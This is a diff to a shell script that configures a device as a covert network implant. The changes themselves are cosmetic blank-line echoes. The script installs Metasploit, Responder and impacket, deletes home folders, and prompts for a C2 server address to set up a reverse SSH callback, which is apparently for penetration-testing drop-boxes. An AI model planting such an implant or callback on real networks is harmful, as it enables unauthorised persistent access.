@@ -17,7 +17,9 @@ EOF
 echo ""
 echo "Welcome To The PiMPlant Script!"
 sleep 4
+echo ""
 echo "Let's Update Your Implant"
+echo ""
 apt-get update -y && apt-get upgrade -y
 echo "Removing Unneeded Directories"
 rm -rf Videos/
@@ -25,6 +27,7 @@ rm -rf Music/
 rm -rf Public/
 rm -rf Templates/
 rm -rf Bookshelf/
+echo ""
 echo "Installing Metasploit"
 sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev libpcap-dev sqlite3 libsqlite3-dev
 cd /opt
@@ -33,8 +36,10 @@ sudo apt-get install ruby-full build-essential
 cd metasploit-framework
 sudo gem install bundler
 bundle install
+echo ""
 echo "Time To Install All The Hacker Packages"
 sleep 4
+echo ""
 cd /opt/
 sudo git clone https://github.com/SpiderLabs/Responder.git
 git clone https://github.com/SecureAuthCorp/impacket.git
@@ -51,6 +56,7 @@ ssh-keygen
 echo "Enter Your C2 Server's IP/Domain"
 read C2IP
 sleep 2
+echo ""
 echo "Time For Some Reverse SSH"
 sleep 3
 touch rev.sh
@@ -64,4 +70,5 @@ echo "All Is Complete"
 sleep 2
 echo "Your Implant Is Configured"
 sleep 2
+echo ""
 echo "Reboot for changes to take effect"
